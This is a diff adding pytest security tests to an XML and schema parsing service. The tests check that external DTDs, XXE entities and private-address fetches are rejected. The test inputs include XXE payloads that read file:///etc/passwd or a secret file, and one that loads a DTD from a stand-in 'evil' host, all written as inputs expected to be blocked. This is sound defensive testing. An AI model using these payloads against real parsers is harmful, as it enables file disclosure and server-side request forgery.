@@ -11,7 +11,9 @@ from fastapi.testclient import TestClient
 from app.config import settings
 from app.main import app
 from app.parser import security
-from app.parser.security import SecurityError, _verify_url, fetch_url
+from app.parser.security import SecurityError, _verify_url, fetch_url, inspect_dtd, normalize_url
+from app.parser.xml_tree import parse_xml
+from app.parser.xsd_store import XsdError, load_xsd
 
 
 @pytest.fixture
@@ -37,6 +39,92 @@ def test_entity_after_4kb_rejected(client: TestClient) -> None:
     payload = "<root>" + ("x" * 5000) + "<!-- <!ENTITY a 'b'> --></root>"
     r = client.post("/api/xml/text", json={"content": payload, "filename": "x.xml"})
     assert r.status_code == 400
+
+
+# --- DOCTYPE: a bounded subset of literal entities is allowed ----------------
+
+XS_ROOT = b'<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="&a;"/>'
+
+
+def test_doctype_without_subset_is_accepted() -> None:
+    doc = b'<?xml version="1.0"?><!DOCTYPE note SYSTEM "note.dtd"><note><to>x</to></note>'
+    assert inspect_dtd(doc) is True
+    assert parse_xml(doc, "note.xml").model.node_count == 2
+
+
+def test_literal_entity_is_expanded_in_a_document() -> None:
+    doc = b'<!DOCTYPE a [<!ENTITY e "hello">]><a><b>&e; world</b></a>'
+    assert parse_xml(doc, "a.xml").model.root.children[0].text == "hello world"
+
+
+def test_literal_entity_is_expanded_in_a_schema() -> None:
+    stored = load_xsd(
+        zip_bytes=None, main_filename="s.xsd", main_bytes=b'<!DOCTYPE schema [<!ENTITY a "urn:x">]>' + XS_ROOT
+    )
+    assert stored.main_filename == "s.xsd"
+
+
+def test_external_dtd_is_never_loaded(tmp_path) -> None:
+    dtd = tmp_path / "ext.dtd"
+    dtd.write_text('<!ENTITY ext "FROMDTD"><!ATTLIST a injected CDATA "yes">')
+    doc = f'<!DOCTYPE a SYSTEM "file://{dtd}" [<!ENTITY e "x">]><a><b>&e;</b></a>'.encode()
+    out = parse_xml(doc, "a.xml").model.reformatted_xml
+    assert "<b>x</b>" in out and "injected" not in out.split("]>")[1]
+    with pytest.raises(ValueError, match="Entity 'ext' not defined"):
+        parse_xml(doc.replace(b"&e;", b"&ext;"), "a.xml")
+
+
+@pytest.mark.parametrize(
+    "subset",
+    [
+        b'<!ENTITY a SYSTEM "file:///etc/passwd">',
+        b'<!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;',
+        b'<!ENTITY a "&b;"><!ENTITY b "x">',
+        b'<!ENTITY a "<xs:element/>">',
+        b"<!ELEMENT a ANY>",
+        b"<!NOTATION n SYSTEM 'x'>",
+        b'<!ENTITY a "' + b"x" * 600 + b'">',
+        b"".join(b'<!ENTITY e%d "v">' % i for i in range(33)),
+    ],
+)
+def test_unsafe_subsets_rejected(subset: bytes) -> None:
+    data = b"<!DOCTYPE schema [" + subset + b"]>" + XS_ROOT
+    with pytest.raises(SecurityError, match="DTD"):
+        parse_xml(data, "s.xml")
+    with pytest.raises(SecurityError, match="DTD"):
+        load_xsd(zip_bytes=None, main_filename="s.xsd", main_bytes=data)
+
+
+@pytest.mark.parametrize(
+    "data",
+    [
+        XS_ROOT + b'<!ENTITY a "x">',
+        b'<!DOCTYPE a [<!ENTITY a "x">]><!DOCTYPE b>' + XS_ROOT,
+        b"<!--" + b"x" * 20_000 + b'--><!DOCTYPE a [<!ENTITY a SYSTEM "file:///etc/passwd">]><a>&a;</a>',
+    ],
+    ids=["outside-doctype", "second-doctype", "past-the-head"],
+)
+def test_dtd_markup_outside_the_one_doctype_rejected(data: bytes) -> None:
+    with pytest.raises(SecurityError):
+        inspect_dtd(data)
+
+
+def test_unsafe_dtd_in_an_included_schema_rejected(tmp_path) -> None:
+    # libxml2 parses includes itself, with entity substitution: every file of
+    # the set must pass inspect_dtd, not only the main one.
+    secret = tmp_path / "secret.txt"
+    secret.write_text("TOPSECRET")
+    xs = 'xmlns:xs="http://www.w3.org/2001/XMLSchema"'
+    included = (
+        f'<!DOCTYPE schema [<!ENTITY x SYSTEM "file://{secret}">]><xs:schema {xs}>'
+        "<xs:annotation><xs:documentation>&x;</xs:documentation></xs:annotation></xs:schema>"
+    )
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as archive:
+        archive.writestr("main.xsd", f'<xs:schema {xs}><xs:include schemaLocation="inc.xsd"/></xs:schema>')
+        archive.writestr("inc.xsd", included)
+    with pytest.raises((SecurityError, XsdError), match="DTD"):
+        load_xsd(zip_bytes=buf.getvalue(), main_filename=None, main_bytes=None)
 
 
 # --- XML node limit ---------------------------------------------------------
@@ -133,3 +221,34 @@ def test_fetch_url_blocks_private(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr(security, "_resolve_all_addrs", lambda host: ["10.0.0.5"])
     with pytest.raises(SecurityError):
         fetch_url("https://internal.example.com/x.xsd")
+
+
+# --- Scheme-less URLs get https://; other schemes stay rejected --------------
+
+
+@pytest.mark.parametrize(
+    ("pasted", "expected"),
+    [
+        ("www.example.org/data/a.xml", "https://www.example.org/data/a.xml"),
+        ("  example.org/a.xml  ", "https://example.org/a.xml"),
+        ("example.org:8443/a.xml", "https://example.org:8443/a.xml"),
+        ("http://example.org/a.xml", "http://example.org/a.xml"),
+    ],
+)
+def test_scheme_less_urls_get_https(pasted: str, expected: str) -> None:
+    assert normalize_url(pasted) == expected
+
+
+@pytest.mark.parametrize(
+    "url", ["ftp://example.org/a.xml", "file:///etc/passwd", "mailto:x@y.z", "localhost/a.xml", "notes"]
+)
+def test_other_input_is_left_for_the_fetcher_to_reject(url: str) -> None:
+    assert normalize_url(url) == url
+    with pytest.raises(SecurityError, match="only http"):
+        fetch_url(url)
+
+
+def test_fetch_url_checks_a_scheme_less_host(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(security, "_resolve_all_addrs", lambda host: ["10.0.0.5"])
+    with pytest.raises(SecurityError, match="'internal.example.com' resolves to a private"):
+        fetch_url("internal.example.com/x.xml")
